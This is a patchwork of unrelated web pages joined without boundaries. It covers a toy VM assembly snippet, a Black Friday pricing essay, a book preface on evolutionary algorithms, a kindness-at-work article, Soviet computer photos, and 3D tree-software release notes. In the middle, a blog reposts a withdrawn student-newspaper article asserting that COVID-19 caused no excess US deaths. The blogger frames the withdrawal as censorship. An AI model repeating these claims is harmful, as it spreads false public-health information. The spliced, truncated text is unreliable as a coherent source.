    SHT R[0] R[29000] 6  // END
    SHT R[0] R[29001] 7  // ESC

    // exit vm if press ESC or END
    CMP R[29000] 0
        EXIT
    CMP R[29001] 0
        EXIT

    GOTO INFINITE_LOOP  // loop forever so we can see the red dot
</code></pre>

    <p><img src="http://adamkulidjian.com/imgs/vram_1px.png"></p><p><b> Ex. 2 </b> red, green, blue pixels in top left corner</p>

    <pre><code>LD R[4101] 0XFF0000FF // red
LD R[4102] 0X00FF00FF // green
LD R[4103] 0X0000FFFF // blue
BLIT

INFINITE_LOOP_2:
    INPUT R[0]
    SHT R[0] R[29000] 6  // END
    SHT R[0] R[29001] 7  // ESC

    // exit vm if press ESC or END
    CMP R[29000] 0
        EXIT
    CMP R[29001] 0
        EXIT

    GOTO INFINITE_LOOP_2  // loop forever

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
		<p>Black Friday and associated late November sales are collectively a neutron star warping the gravitational field of the annual consumer spending cycle. The story of <a href="https://en.wikipedia.org/wiki/Black_Friday_(shopping)">how Black Friday came to be</a> is fairly simple: a focal point for sales gaining momentum year after year. While Black Friday started with American big box retailers offering discounts to consumers shopping primarily for Christmas gifts, it has turned into a cultural event in itself and has, in recent years, even come to the creator&nbsp;economy.</p>
<p>Depending on your model, this can be a good or a bad thing. Sure, now-defunct department stores offering discounts on televisions a decade ago shouldn’t be the basis for deciding how to price my information products. But, everyone choosing to run a discount at the same time of year is a great reason for me to choose to discount my own products. So, let’s talk about the Obligatory Late November Sale (<span>OLNS</span>).</p>
<p>I’ve worked retail on holidays; I have reason to dislike Black Friday. But, I’ve also walked through midwestern malls with friends from Russia, Iran, and Germany, all staying over for Thanksgiving, spectating and indulging in the excesses of the America they have seen on <span>TV</span>. Rather than trying to develop moral arguments for and against Black Friday as a whole, I’m tackling the much easier task of developing one game theoretic model for and one against the <span>OLNS</span> specifically applied to the online creator&nbsp;economy.</p>
<p>If you have no background in Game Theory, spend a few minutes <a href="https://www.investopedia.com/terms/g/gametheory.asp">here</a> or just look up terms that are unfamiliar as you&nbsp;go.</p>
<p>All models are wrong, some are useful. The usefulness of a model starts with the underlying assumptions. There are two important simplifying assumptions that I am making in the following models. The first is that offering a <span>OLNS</span> does not materially increase the creator’s reach. This assumption is based on the difficulty of standing out from the noise of everyone offering some sort of Black Friday discount. Thus, another necessary assumption is that some percent of a creator’s audience has not yet bought their&nbsp;product.</p>
<p>The second simplification is that I am playing fast and loose with the idea of a “player” in game theory. Game theorists have developed more sophisticated models than the ones presented below for modeling one player’s interactions against a prevailing norm rather than a single other player. However, by making my model more wrong (using a two-person creator economy), I can actually make it more widely useful by requiring less econ background to understand the&nbsp;model.</p>
<h3>Model 1: Prisoner’s&nbsp;Dilemma</h3>
<p>Thesis: Creators don’t want to run discounts because they lose out on&nbsp;margin.</p>
<p>If creators don’t want to run discounts, running a <span>OLNS</span> is a prisoner’s dilemma. Let’s take two creators, Alice and Bob, who each sell a similar information product in the same market. Their information products each costs 33 dollars, each Alice and Bob is considering a 1/3 discount to 22&nbsp;dollars.</p>
<p>If neither Alice nor Bob runs a discount, each will sell 10 units, the same as they sell every week. However, if Alice runs a discount, she will attract 6 more customers. Let’s say that 3 are new participants in the market and the other 3 would have bought from Bob but for the discount. The same thing happens in reverse if Bob runs a discount. However, if they both run discounts, they each attract 3 new customers, but neither steals the others’ customers. It is important to note here that I am <span>NOT</span> modeling a discount as a zero-sum game, which would be inappropriate for a large market like the creator&nbsp;economy.</p>
<p>Here is a payoff matrix of revenue for that&nbsp;situation:</p>
<p><img alt="PD Payoff Matrix" src="https://philipkiely.com/assets/img/olns_pd.png"></p>
<p>Alice and Bob both have a dominant strategy of running a discount, but both will end up with less revenue than if neither had&nbsp;discounted.</p>
<p>Astute readers may note that these numbers, which are totally fabricated, could be altered such that running a discount is a good deal for both parties. Why not conjure up more customers attracted by the&nbsp;discount?</p>
<h3>Model 2:&nbsp;Assurance</h3>
<p>Thesis: Creators want to run discounts to generate marginal&nbsp;sales.</p>
<p>Let’s slightly adjust the above model: regardless of whether Alice or Bob runs the discount alone or at the same time, if one runs a discount, they get 6 additional customers, and these are all new customers and not from each others’ customer bases. The model is a bit different now, but they have the same dominant strategy: run the sale regardless of the others’&nbsp;action.</p>
<p><img alt="A1 Payoff Matrix" src="https://philipkiely.com/assets/img/olns_a1.png"></p>
<p>However, this model doesn’t yet answer why it is strictly beneficial for creators to run discounts at the same time. Well, consumer psychology is a tricky thing. For information products, generally priced at a premium (charge more!) and targeted at professional audiences, frequent discounts can undermine the credibility of the price and product. Price uncertainty can delay purchases, after all, if the product is randomly discounted, why not wait? After running random sales, I’ve even had customers making a purchase a day before or after write to me asking to get refunded down to the sale price. People don’t like to feel like they missed&nbsp;out.</p>
<p>So, if running a sale, especially a major discount that really attracts the marginal customer, is risky, and doing it too often cuts into your margin and credibility, then you want to run such sales infrequently but predictably. Thus, the Obligatory Late November Sale actually represents a wonderful opportunity! You can run your deep discount and customers are expecting it. Many creators and larger businesses participating isolates you from most backlash, after all, it is on the customer if they didn’t see it coming or they missed it. Customers unwilling to pay full price will wait for a known date, while customers paying full price ahead of time will know that they could have waited and are choosing not&nbsp;to. </p>
<p>Let <em>R</em> be the reputation hit from having a random sale. Then, for Alice and Bob, the assurance model of the <span>OLNS</span>&nbsp;is:</p>
<p><img alt="PD Payoff Matrix" src="https://philipkiely.com/assets/img/olns_a2.png"></p>
<p>Running a sale at the same time gives both creators extra revenue without the reputation&nbsp;hit.</p>
<p>Coordinating a sale between every creator would be very difficult. Assurance models have the idea of focal points, so everyone who knows the payoffs and participants could come up with the same focal point without communicating. Black Friday is, as I stated at the beginning, a neutron star of a focal point, making it easy for creators everywhere to run a sale at the same&nbsp;time.</p>
<h3>Model 3:&nbsp;Anecdote!</h3>
<p>I started running my Obligatory Late November Sale less than 48 hours ago at the time of writing. After a tweet announcing the discounts, yesterday I made enough to fill the fridge and pantry at Trader Joe’s, today I made enough to buy some secondhand furniture for my new apartment. Fortunately, I’m not in the position of relying on this income to do those things, but even still paying for material expenses with information product money feels <em>really</em>&nbsp;good.</p>
<p><img alt="Gumroad Analytics Screenshot" src="https://philipkiely.com/assets/img/olns_ss.jpg"></p>
<p>Of course, I have to let you know that my book <a href="https://philipkiely.com/wfsd">Writing for Software Developers is 30% off</a> until the end of the month. The discount should be applied automatically, if not, use the code “olns” (obligatory late november sale). Also, <a href="https://philipkiely.com/cefip">Cold Email for Interesting People</a> is still pay-what-you-want, but pay 30% less I&nbsp;guess?</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

<div>
<div>

<p>Evolutionary Algorithms (<em>EAs</em>) are a fascinating class of algorithms for meta-heuristic optimisation. There exist many books on the topic of EAs, ranging from their theory to practice. The first book I read on the topic was <em>Genetic algorithms in search, optimization, and machine learning</em> by David E. Goldberg (1989), and to this day I still recommend it to new students in the field.</p>

</div>
</div>
</div><div>

<div>
<p>However, there is a re-occurring difficulty when my students are starting out in the field, <em>"how do I move from theory to practice?"</em>. Most books will have some chapters dedicated to applications of EAs, but what's missing is an up-to-date book dedicated to using modern technology and concepts.</p>
</div>
</div><div>

<div>
<div>
<p>When writing this book, I had to answer some difficult questions:</p>
<ul>
<li>What programming language will my examples be written in?</li>
<li>What software libraries will I use?</li>
<li>How do I structure the chapters and sections, do I lead entirely by example or do I dedicate some parts to the theory?</li>
<li>Do I focus on single-objective EAs or multi-objective EAs?</li>
</ul>
<p>Nevertheless, the decisions had to be made. I selected Python as the programming language simply due to its rise in popularity (in 2019), and this was only a difficult choice because there is a wealth of resources written for MATLAB. Of the resources written in MATLAB, it is a shame to not be able to use PlatEMO, which is a well-maintained open-source platform for Evolutionary Multi-objective Optimisation. In its place, when a software library is needed, I will turn to Platypus, which provides optimisation algorithms and analysis tools for multi-objective optimisation.</p>
<p>For the structure of the chapters and sections, I have decided to lead entirely by example. There will be code to demonstrate every concept used, and I will show how we can implement algorithms from their mathematical representation. In these cases, I will focus on the readability of the implementations rather than their performance.</p>
<p>Finally, I will focus on multi-objective EAs as this represents the majority of real-world problems. However, single-objective EAs will make an appearance to highlight the differences between the two.</p>

</div>
</div>
</div><div>

<div>
<p>Perhaps the most difficult question to answer is <em>where do we start?</em> There is so much to cover, and many potential starting points. For this book, I will start with a definition of objective functions, and illustrate the relationship between what we call the problem space and the objective space. With this approach, I hope there will be a clear understanding of what the various operators within an EA are affecting.</p>

This is post 2 of 2 in the series <em>“Essential skills for software engineers”</em> </p>
<p>Raw coding skills are only a fraction of what your future dream company is looking for. There are also the so-called “soft skills” – I personally don’t like this term – let’s simply call them skills, too. Both are crucial to your job. I’ll walk you through each skill area, reason about its importance, and then show you the usual expectations depending on your level.</p>
</label></p>
</div>
<p>Sounds fuzzy and a bit bulls*itty, right? Well, it turns out that if your teammates are pricks, you tend to quit or stay and be unhappy and demotivated. This is not fluff; studies and surveys confirm this. We spend a lot of time in our work communities, and it’s vital to be surrounded by people who care, with whom we feel comfortable.</p>
<p>This does not depend on software engineering levels – it’s a universal trait. It’s also technically not a skill, yet there’s a surprising amount of practice involved in getting better at showing kindness. This is not just about having a positive attitude by default – but being genuinely kind to others.</p>
<h2>Why is kindness important?</h2>
<p>Besides leaders’ responsibility to create humane, caring environments for their teams there are well-understood business reasons, too:</p>
<p>In a <a href="https://hbr.org/2013/01/the-price-of-incivility" target="_blank" rel="noopener">2013 article</a> published in Harvard Business Review, Christine Porath said her work shows that teams that work in an environment where rudeness, bullying, demeaning comments, and insults are commonplace usually become fractured. People lose confidence, have low levels of trust, and become less helpful. Bad behavior, she adds, destroys collaboration, is harmful to mental health, and has been proven to be a significant barrier to efficiency.</p>
<p>Forbes argues that <a href="https://www.forbes.com/sites/ellevate/2018/03/06/science-proves-kindness-is-your-competitive-advantage/" target="_blank" rel="noopener">kindness is a competitive advantage</a>. I hope it becomes the standard. In a <a href="https://peakon.com/heartbeat/reports/the-employee-voice/" target="_blank" rel="noopener">study, Peakon found</a> that their coworkers were the 4th item most employees would like to change – right after salary, communication, and management.</p>
<blockquote><p>Kindness helps your peers feel safe, and if they feel safe people take the risks that enable efficient, honest communication and thus real collaboration.</p></blockquote>
<h2>What is kindness?</h2>
<p>Kindness is showing interest in your peers’ wellbeing; this goes from simply asking them how their weekend went to remembering they had a hard time with something two weeks ago and following up on that. It’s really these simple, everyday things, but doing them consistently.</p>
<p>Kindness is understanding that we all struggle sometimes.</p>
<p>A form of kindness is when faced with a frustrating situation, we don’t assume malice. Instead, we assume good intentions and reach out to clarify.</p>
<p>One key to kindness is empathy – being able to relate to others, understanding how they feel. There are three kinds of empathy:</p>
<h3>Cognitive empathy</h3>
<p>Cognitive empathy is about thought as much as emotion. It is knowing, understanding, or comprehending on an intellectual level. Knowing how the other person feels and what they might be thinking. This is crucial, but often not enough since you still can be disconnected from or ignore deeper emotions; it doesn’t put you in another’s shoes in a felt sense. Understanding sadness is not the same thing as feeling sad.</p>
<p>Yet, without this, we can’t even talk about understanding others.</p>
<h3>Emotional empathy</h3>
<p>Emotional Empathy, just like it sounds, involves directly feeling the emotions that the other person is feeling. It is actually very “biological”, it’s deeply rooted in our so-called <a href="https://www.apa.org/monitor/oct05/mirror" target="_blank" rel="noopener">mirror neurons</a>. Sometimes this helps the other person (“misery loves company”) but it can easily backfire if you yourself lack the ability to manage distressing emotions. It can really help in forming a connection, though – as it conveys the message “wow, this person really understands me and cares for me”. Just remember, put on your own oxygen mask before helping others.</p>
<h3>Compassionate empathy</h3>
<p>Compassionate Empathy strikes a powerful balance of the two other kinds above by relying on your <strong>emotional intelligence</strong> to effectively respond to the situation with a loving detachment.</p>
<p>It honors the natural connection by considering both the felt senses and intellectual situation of the person without losing yourself in the situation. Thus, it enables you to naturally act in the other person’s interest (vs. passively observing or losing yourself to distressing emotions).</p>
<p>Compassionate empathy is the kind that’s useful in most situations.</p>

<p>Remember that I said kindness doesn’t depend on levels? Well, there’s one nuance – the more your perceived power and authority shifts as you level up, the more aware you need to be to practice active kindness. Most people will get less engaged and even demotivated when working with someone cold in power. Another reason is that people look at you for leadership, and your behavior will get copied, so you’re responsible for leading by example.</p>
<h2>Why is kindness not trivial?</h2>
<p>The main reason is that we bring our personal fears, insecurities, expectations, and context to work. Interestingly, the more skilled your team is, the harder it can get!</p>
<p>We all have a unique background, and not everyone has the same experience that we have. It can be surprising when you encounter someone that hasn’t worked with the technology that you have (“What do you mean you don’t know what a monad is?”). We often forget that the job is not to show how smart we are.</p>
<p>We all have bad days in a bad mood. On days like this, it can take a lot of work for us to come across as kind persons (and it’s all right, you should also receive kindness).</p>
<p>Communication is hard, each message goes through multiple filters by the time it gets to the recipient. Such filters are your tone, body language, phrasing the recipient’s mental and emotional state, their expectations in the situation, cultural and social conditioning. We think we’ve said what we meant to say, but the message easily gets distorted by these filters, e.g. turning a neutral sentence into an attack (“Can I help you?” –&gt; “I don’t trust you can do your job”).</p>
<h2>Low hanging fruits of kindness for software engineers</h2>
<p>Here is a list of things you can start with right now:</p>
<ul><li><strong>Be patient with career starters</strong>. Being a junior developer is very difficult. Provide them a safe space where they can fail and be instructed, with kindness, about how to prevent the mistake again. Proactively reach out and mentor them.</li><li><strong>Do not mock someone for their chosen language or framework</strong>.</li><li><strong>Show forgiveness when something breaks</strong>. Outages suck, but even if you can trace it back to a stupid human error, you can’t imagine how that person could have made it; remember that this just shows the system’s weakness and the processes around it. We all make mistakes. Please don’t make it personal.</li><li><strong>Celebrate victories, even small ones</strong>.</li><li><strong>Use inclusive language</strong>. You’ll be surprised how bad we are at this, intrinsically. </li><li><strong>Learn about body language and understand your default modes there.</strong></li><li><strong>Manage your stress (know your limits, make sure you rest and recharge)</strong></li><li><strong>Be a compassionate code reviewer, not a critic.</strong></li><li><strong>Use humor. Then use some more. </strong>Good for you and good for your environment.</li><li><strong>In frustrating situations, assume goodwill, not malice. </strong>See <a href="https://en.wikipedia.org/wiki/Hanlon%27s_razor" target="_blank" rel="noopener">Hanlon’s razor</a>.</li><li><strong>Smile</strong>!</li><li><strong>Thank people for their help publicly.</strong></li></ul>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="articleBody"><p>The building did not stand out. Unremarkable industrial building, which was built in hundreds of Soviet cities.<span id="more-10215"></span></p>
<p>Non-broken glass, burning lights, live plants inside, modern plastic entrance doors. Except for one floor.</p>
<!-- WP QUADS Content Ad Plugin v. 2.0.17.1 -->


<p>Despite the twilight, the floor remained lifelessly dark. Somewhere in the depths, there was a dim glow of electric light, hardly penetrating through old glass blocks.</p>
<p>Inside the floor was empty and black, but not completely.&nbsp;Inside burned several fluorescent lamps, spotlighting dozens of silhouettes of tall cabinets.</p>
<p>Some of them were covered with darkened translucent film.</p>
<p>The surface of the floor, tables and enclosures covered with black spots of soot, sometimes diluted with white stains of dried extinguishing mixture.</p>
<p>The air felt a persistent, but not strong smell of burning.&nbsp;The fire walked here a few years ago but did not touch the equipment.</p>
<p>Part of the cabinets were antique electronic computers. Others served to measure signals, and computers controlled this process. Dozens of terminals froze on the tables with extinct screens.</p>

<p>Suddenly it became clear that before them the legendary machine “Saratov-2”.&nbsp;The machine, which was massively placed on many enterprises of the Soviet Union in the 70s, but at the same time, not a single high-quality (I’m not talking about color) photos remained. Not on the Internet, not even in the museum of the enterprise developer.</p>

<p>This computer did not even have a traditional microprocessor. Domestic clone of the popular American PDP-8, Saratov-2 was produced in two versions.</p>
<p>Steel frame, like a chest of drawers, filled with drawers.&nbsp;Different boxes responded to various computer nodes — a twelve-bit computing unit, input-output device interfaces, and RAM.</p>
<p>The memory was ferromagnetic – two boxes of four cubes in each. Reading or writing programs occurred through punched tapes, and to display the results of calculations used electric typewriter CONSUL-260.</p>
<p>The monitor and keyboard in that era were not yet a much-needed</p>
<p>part of the computer. The necessary input of programs into the operative memory was carried out in binary codes, manually using a group of switches on the front panel. Bulbs controlled the correctness of the input.</p>

<p>The next generation of computers was Electronics 100/25. These machines were clones of American PDP-11.</p>
<p>They thought faster, had more memory, allowed them to work with magnetic tape drives and punched tapes, but the general principle remained the same.</p>
<p>It was possible to connect a monitor and a keyboard to this computer, while still having the ability to enter programs through the front switches.</p>

<p>Electronics-60 – the further development of Electronics 100/25. The same architecture, but bulky tape drives are a thing of the past.</p>
<p>They were replaced by flexible eight-inch floppy disks. The new chipset, allowed to fit the processor module, power supply and control devices, in a very compact size.</p>
<p>I note that all these computers were managers, that is, they worked with a bunch of external equipment. It could be machine tools, laboratory complexes, measuring devices.</p>

<p>15VM16-1 some early version of Electronics-60, having a control panel of light bulbs and switches. Assembled on the element base of the previous Electronics 100/25. I occupied a small nightstand built into the table on which the controlled equipment was placed.</p>

<p>DVK-2M or Interactive Computing Complex. Massive, stylish in appearance, the computer of the 80s, which could be considered a personal computer.</p>
<p>It consisted of two desktop blocks – processor and pairing. A set of interchangeable interface cards allowed connecting drives of various types, a monochrome monitor on an openwork leg, and a keyboard.</p>
<p>Back in 1993, when we were studying, one teaching DVK could distribute programs for a couple of dozen Spectrums through the network.</p>

                                                                                <p>Johns Hopkins published this study on Sunday which posits that Covid is nowhere near the disaster we're being told it is. I would summarize it for you or offer pull-quotes but honestly you just have to read it yourself because it's mind-blowing. <a target="_blank" href="https://www.jhunewsletter.com/article/2020/11/a-closer-look-at-u-s-deaths-due-to-covid-19">The original article</a> is now deleted from the Johns Hopkins website ... for some reason. Luckily the internet is forever and it's available via<a target="_blank" href="https://web.archive.org/web/20201126223119/https://www.jhunewsletter.com/article/2020/11/a-closer-look-at-u-s-deaths-due-to-covid-19"> the Wayback Machine</a>. Here is the article in its entirety:</p><p>* * *</p><p>According to <a target="_blank" href="https://web.archive.org/web/20201126223119/https://www.theguardian.com/world/2020/nov/21/covid-world-map-which-countries-have-the-most-coronavirus-cases-and-deaths">new data</a>, the U.S. currently ranks first in total COVID-19 cases, new cases per day and deaths. Genevieve Briand, assistant program director of the Applied Economics master's degree program at Hopkins, critically analyzed the effect of COVID-19 on U.S. deaths using data from the Centers for Disease Control and Prevention (CDC) in her webinar titled "COVID-19 Deaths: A Look at U.S. Data."</p><p>From mid-March to mid-September, U.S. total deaths have reached 1.7 million, of which 200,000, or 12% of total deaths, are COVID-19-related. Instead of looking directly at COVID-19 deaths, Briand focused on total deaths per age group and per cause of death in the U.S. and used this information to shed light on the effects of COVID-19.</p><p>She explained that the significance of COVID-19 on U.S. deaths can be fully understood only through comparison to the number of total deaths in the United States.</p><p>After retrieving data on the CDC website, Briand compiled a graph representing percentages of total deaths per age category from early February to early September, which includes the period from before COVID-19 was detected in the U.S. to after infection rates soared.</p><p>Surprisingly, the deaths of older people stayed the same before and after COVID-19. Since COVID-19 mainly affects the elderly, experts expected an increase in the percentage of deaths in older age groups. However, this increase is not seen from the CDC data. In fact, the percentages of deaths among all age groups remain relatively the same.</p><p>"The reason we have a higher number of reported COVID-19 deaths among older individuals than younger individuals is simply because every day in the U.S. older individuals die in higher numbers than younger individuals," Briand said.</p><p>Briand also noted that 50,000 to 70,000 deaths are seen both before and after COVID-19, indicating that this number of deaths was normal long before COVID-19 emerged. Therefore, according to Briand, not only has COVID-19 had no effect on the percentage of deaths of older people, but it has also not increased the total number of deaths.</p><p>These data analyses suggest that in contrast to most people's assumptions, the number of deaths by COVID-19 is not alarming. In fact, it has relatively no effect on deaths in the United States.</p><p>This comes as a shock to many people. How is it that the data lie so far from our perception?</p><p>To answer that question, Briand shifted her focus to the deaths per causes ranging from 2014 to 2020. There is a sudden increase in deaths in 2020 due to COVID-19. This is no surprise because COVID-19 emerged in the U.S. in early 2020, and thus COVID-19-related deaths increased drastically afterward.</p><p>Analysis of deaths per cause in 2018 revealed that the pattern of seasonal increase in the total number of deaths is a result of the rise in deaths by all causes, with the top three being heart disease, respiratory diseases, influenza and pneumonia.</p><p>"This is true every year. Every year in the U.S. when we observe the seasonal ups and downs, we have an increase of deaths due to all causes," Briand pointed out.</p><p>When Briand looked at the 2020 data during that seasonal period, COVID-19-related deaths exceeded deaths from heart diseases. This was highly unusual since heart disease has always prevailed as the leading cause of deaths. However, when taking a closer look at the death numbers, she noted something strange. As Briand compared the number of deaths per cause during that period in 2020 to 2018, she noticed that instead of the expected drastic increase across all causes, there was a significant decrease in deaths due to heart disease. Even more surprising, as seen in the graph below, this sudden decline in deaths is observed for all other causes.</p><mediatag id="57319"></mediatag><p><i>Graph depicts the number of deaths per cause during that period in 2020 to 2018.</i></p><p>This trend is completely contrary to the pattern observed in all previous years. Interestingly, as depicted in the table below, the total decrease in deaths by other causes almost exactly equals the increase in deaths by COVID-19. This suggests, according to Briand, that the COVID-19 death toll is misleading. Briand believes that deaths due to heart diseases, respiratory diseases, influenza and pneumonia may instead be recategorized as being due to COVID-19.</p><mediatag id="57320"></mediatag><p><i>Graph depicts the total decrease in deaths by various causes, including COVID-19.</i></p><p>The CDC classified all deaths that are related to COVID-19 simply as COVID-19 deaths. Even patients dying from other underlying diseases but are infected with COVID-19 count as COVID-19 deaths. This is likely the main explanation as to why COVID-19 deaths drastically increased while deaths by all other diseases experienced a significant decrease.</p><p>"All of this points to no evidence that COVID-19 created any excess deaths. Total death numbers are not above normal death numbers. We found no evidence to the contrary," Briand concluded.</p><p>In an interview with <i>The News-Letter</i>, Briand addressed the question of whether COVID-19 deaths can be called misleading since the infection might have exacerbated and even led to deaths by other underlying diseases.</p><p>"If [the COVID-19 death toll] was not misleading at all, what we should have observed is an increased number of heart attacks and increased COVID-19 numbers. But a decreased number of heart attacks and all the other death causes doesn't give us a choice but to point to some misclassification," Briand replied.</p><p>In other words, the effect of COVID-19 on deaths in the U.S. is considered problematic only when it increases the total number of deaths or the true death burden by a significant amount in addition to the expected deaths by other causes. Since the crude number of total deaths by all causes before and after COVID-19 has stayed the same, one can hardly say, in Briand's view, that COVID-19 deaths are concerning.</p><p>Briand also mentioned that more research and data are needed to truly decipher the effect of COVID-19 on deaths in the United States.</p><p>Throughout the talk, Briand constantly emphasized that although COVID-19 is a serious national and global problem, she also stressed that society should never lose focus of the bigger picture — death in general.</p><p>The death of a loved one, from COVID-19 or from other causes, is always tragic, Briand explained. Each life is equally important and we should be reminded that even during a global pandemic we should not forget about the tragic loss of lives from other causes.</p><p>According to Briand, the over-exaggeration of the COVID-19 death number may be due to the constant emphasis on COVID-19-related deaths and the habitual overlooking of deaths by other natural causes in society.</p><p>During an interview with <i>The</i> <i>News-Letter </i>after the event, Poorna Dharmasena, a master's candidate in Applied Economics, expressed his opinion about Briand's concluding remarks.</p><p>"At the end of the day, it's still a deadly virus. And over-exaggeration or not, to a certain degree, is irrelevant," Dharmasena said.</p><p>When asked whether the public should be informed about this exaggeration in death numbers, Dharmasena stated that people have a right to know the truth. However, COVID-19 should still continuously be treated as a deadly disease to safeguard the vulnerable population.</p><p>* * *</p><p>Facebook and Twitter will certainly block this article within hours of its publication. Just like Johns Hopkins deleted it from its site. The question is ... why?</p><mediatag id="57334"></mediatag><mediatag id="57329"></mediatag><mediatag id="57331"></mediatag><mediatag id="57332"></mediatag><p>* * *</p><p><strong>UPDATE</strong>: JHU tweeted that they deleted the article because it "was being used to support false and dangerous inaccuracies about the impact of the pandemic."</p><mediatag id="57420"></mediatag><p>Importantly, they didn't say anything in the article was incorrect. So we're just memory-holing studies that don't align with the narrative? Got it.</p>

<p><em>The past year I’ve been exploring a number of theories that will benefit the growth algorithm in exciting, and surprising ways. These ideas are slowly but surely crystallizing into a coherent release, but it takes time to perfect. Because of that, I’ve been working in parallel on this release here, one that doesn’t touch the algorithm at all. It instead improves the end result, the actual tree models, and on fun tools to manipulate them!</em></p><p><em>A big effort was made to take the tree models to the next level. Better mesh quality with smoother transitions, better UV maps and a welcome speed boost. And the freedom of adding as many different twig models as you like. But let’s start with the bend tool… Have fun growing!</em></p>

<h2>Bend Tool</h2>
<p><img loading="lazy" src="https://www.thegrove3d.com/wp-content/uploads/2020/04/BendTool.jpg" alt="" width="1280" height="528"></p>
<div>
<div><p>
This fun new tool is inspired by the Bonsai technique of wiring and bending branches. After wrapping a branch in metal wire, you can then bend the branch into a pleasing curve. Several months of growth will solidify the tension in the branch, and the wire can be removed.</p>
<p>This allows you to realign branches and make them grow in the direction you want them to – it literally adds a lot of flexibility. Quite a bit more flexibility than realistically possible – you can bend any branch regardless of its thickness without the fear of snapping. So while the bonsai technique is limited to small trees, you can now apply the same principles to shape full grown hero trees.</p>
<p>The tool adds a new level of interactivity to The Grove. It starts by selecting a branch node. Hovering your mouse will highlight the thickest branch node close to the mouse. Left click to select, then whirl your mouse around that point to adjust the angle. Use the scroll wheel to adjust the radius of the bend.</p>
</div>
<div>
<h3>Curves</h3>
<p>There are 3 different curves for the bend tool. Each creates a different shape along the bend. <em>Automatic</em> is a simple curve that gives a natural bend. Press tab to switch to the <em>Flexible</em> curve. Now you can increase the curvature along the length of the bend by moving the mouse closer to the origin of the bend. And then there’s a third curve that you can access by again pressing tab. The <em>S-curve</em> blends from a simple bend to a curling snake when you increase the angle.</p>
</div>
</div>


<h2>Twigs, twigs, twigs…</h2>
<p><em>The Grove uses two types of twigs – side twigs and the often longer end twigs. This gives enough variation for many types of trees, with minimal visible repetition. It’s surprising that – on many trees – we could get away with just two twigs. But there are just as many trees that need more variation – trees with more distinct visual features.</em></p>
<div>
<div>
<p><img loading="lazy" src="https://www.thegrove3d.com/wp-content/uploads/2020/03/DeadTwigsSmall.jpg" alt="" width="1280" height="528"></p>
<h3>Dead Twig</h3>
<p>While before dead branches were bare, you can now use a special twig to add more detail to the weaker parts of a tree, mostly the lower crown. A dead twig can simply be the same twig stripped of leaves, or it could be a twig with wilted or dry brown leaves. On a pine tree it can still hang on to several browned needles, curled up by drought.</p>
<p>Dead twigs appear on dead branches and they stay there for the number of years that you specify with the <em>Wither</em> parameter.</p>
<h3>Upward Twig</h3>
<p>An optional twig object that that overrides the end twig when it’s growing steeply upward. Vertical twigs are often more powerful and even longer, and the leaves are arranged differently, so that they enjoy most of the sun. When a twig is growing nearly vertical, leaves start twisting around the branch while each one is facing up to the sky.</p>
<p>If no upward twig is set, it will use the same object that is set for the end twig. It’s completely optional. I intend start adding upward twigs to existing twig models soon.</p>
</div>
<div>
<h3>Twig Collections</h3>
<p>Instead of duplicating just a single end twig, and just a single side twig, entire collections of twig variations can now be used. Pick a collection and the objects in it will be randomly picked for each duplicate.</p>
<p>External twig files now also support this. Here’s how to correctly structure a *.blend file to be used as a twig, for listing in the twigs menu. It’s the same as a normal twig, but then put your twig models in collections and add ‘sidetwig’, ‘endtwig’, ‘upward’ or ‘dead’ in the name of the collections.</p>
<p><img loading="lazy" src="https://www.thegrove3d.com/wp-content/uploads/2020/04/TwigCollections2.jpg" alt="" width="1280" height="528"></p>
<p>Now that there’s much more variation in twigs, with collections, upward twigs and dead twigs, it’s time to tidy up. Appended twigs are now neatly joined in their own collections inside the twigs collection.</p>
<h3>Existing Twigs</h3>
<p>Existing twigs do not (yet) have the new variations for upward and dead twigs, I’m working on that. For now it’s pretty simple to add for instance an upward twig. Open the twig file and duplicate the end (apical) twig. Change its name, remove ‘apical’ from the name and instead add ‘upward’. Then temporarily rotate the twig to point up. Use Blender’s modeling tools to bend and rotate the leaves into positions that don’t defy gravity. Then when you’re done making changes, rotate the twig back to the original direction pointing right and save the file.</p>
<p>More twigs are underway and they will be rich with variations!</p>
</div>
</div>


<h2>Better mesh building</h2>
<p><img loading="lazy" src="https://www.thegrove3d.com/wp-content/uploads/2020/04/BuildImprovementsB1.jpg" alt="" width="1280" height="528"></p>
<div>
<div>
<h3>Twist Fix</h3>
<p>I finally fixed the sudden twists that would sometimes show up when building branches, especially on dangling branches and branches that make strange turns. With the new bend tool, these types of branches are far more common and so this problem really needed to be fixed!</p>
<p><img loading="lazy" src="https://www.thegrove3d.com/wp-content/uploads/2020/04/Twist2.jpg" alt="" width="1280" height="528"></p>
<p><em>Smoothly interpolated twisting along the length of the branch, no matter how crazy the twists or turns may be.</em></p>
<h3>Smooth taper</h3>
<p>I added something extra to remedy sudden steps down in thickness along the same branch. It detects an extreme decrease in radius, and then looks ahead one node further – and if that node has a much smaller decrease, it will smooth the branch for a natural taper.</p>
<h3>Side takeover</h3>
<p>When a side branch grows stronger than its parent branch, it becomes the new lead. This can create a sudden kink in the branch caused by the initial angle of the side branch. In nature this angle will be filled up by new growth to form a smooth transition. In an earlier release, I already tackled this problem, but I was adding an extra node to create a smooth transition. But it turned out that this extra node could cause problems when the branch gets thicker – the small internode length combined with the sudden angle could create ugly geometry instead of the desired smoothing. Especially when two branches continue battling for dominance, and the smoothing is applied multiple times, from one branch to the next!</p>
<p>So instead of adding an extra node, I’m now using the existing nodes and offset them to create a good transition. No matter how many times this smoothing is applied, it causes no problem.</p>
<h3>Angles</h3>
<p>Smoothing of sudden angles was a step in the simulation that was performed every year, ironing out the sudden angles along the length of branches. But the effect was too strong, so strong in fact that it almost completely nullified the effects of <em>Turn Random Pitch</em> and <em>Heading</em>. So now it’s a separate <em>Smooth</em> operator that you can find in the <em>Build</em> panel. It’s at your disposal when you want the smooth look, and you can even apply smoothing multiple times to increase the effect.</p>
</div>
<div>
<h3>Branch smoothing modulation</h3>
<p>The premise for smoothing at branching points is the formation of branch collars. These collars give the branch a fluid continuation into its lead branch. Along the way, I’ve improved this transition bit by bit. But I might have gone one step too far. The effect should only show up over time, when the branch grows thicker. If you look at young twigs, these just branch off at an acute angle, no smoothing whatsoever. So for this release, I’ve improved the branch smoothing to get stronger with thickness.</p>
<p><img loading="lazy" src="https://www.thegrove3d.com/wp-content/uploads/2020/04/SmoothingModulation.jpg" alt="" width="1280" height="528"></p>
